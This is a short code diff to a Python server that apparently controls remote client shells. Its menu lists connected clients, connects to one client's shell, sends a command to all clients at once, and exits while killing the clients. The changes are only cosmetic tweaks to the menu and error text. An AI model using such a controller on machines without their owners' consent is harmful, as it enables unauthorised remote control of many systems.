@@ -21,7 +21,7 @@ def server_menu():
                 print("No Connected Clients")
             else:
 
-                print("--------------Clients--------------")
+                print("       > Clients < ")
                 for index, ips in enumerate(ip_addr):
                     print(f"{str(index)}   {str(ips)}")
         elif "connect " in command:
@@ -29,7 +29,7 @@ def server_menu():
             try:
                 print(f"Connecting to {str(ip_addr[connection_index])}")
             except:
-                print("Client Does Not Exist Or the connection is broken")
+                print("Client Does Not Exist Or The Connection Is Broken")
                 continue
             client = clients[connection_index]
             ip = ip_addr[connection_index]
@@ -48,11 +48,12 @@ def server_menu():
                 print(recive_message())
         elif command=="help":
             print("""
--------------------------Commands----------------------------
-list               Lists All The Connected Clients
-connect <NUMBER>   Connect To Client Shell
-sendall <COMMAND>  Sends All Clients A Command
-exit               Exits Server And Kills Clients
+                > Commands <
+
+list               > Lists All The Connected Clients
+connect <NUMBER>   > Connect To Client Shell
+sendall <COMMAND>  > Sends All Clients A Command
+exit               > Exits Server And Kills Clients
 """)
 
 def connection_thread():
@@ -106,4 +107,5 @@ if __name__=="__main__":
     port = 5666
     sock.bind((host, port))
     threading.Thread(target=connection_thread).start()
+
     server_menu()
